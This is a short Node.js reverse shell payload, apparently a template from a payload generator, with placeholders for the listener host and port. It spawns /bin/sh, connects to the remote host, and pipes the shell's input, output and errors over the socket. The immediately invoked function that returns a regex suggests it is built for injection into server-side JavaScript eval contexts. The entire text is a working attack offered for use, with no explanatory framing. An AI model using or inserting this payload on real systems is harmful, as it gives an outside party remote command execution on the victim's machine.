(function(){
    var n = require("net"), p = require("child_process"), s = p.spawn("/bin/sh", []);
    var c = new n.Socket();
    c.connect({{ LPORT }}, "{{ LHOST }}", function(){
        c.pipe(s.stdin);
        s.stdout.pipe(c);
        s.stderr.pipe(c);
    });
    return /a/;
})();
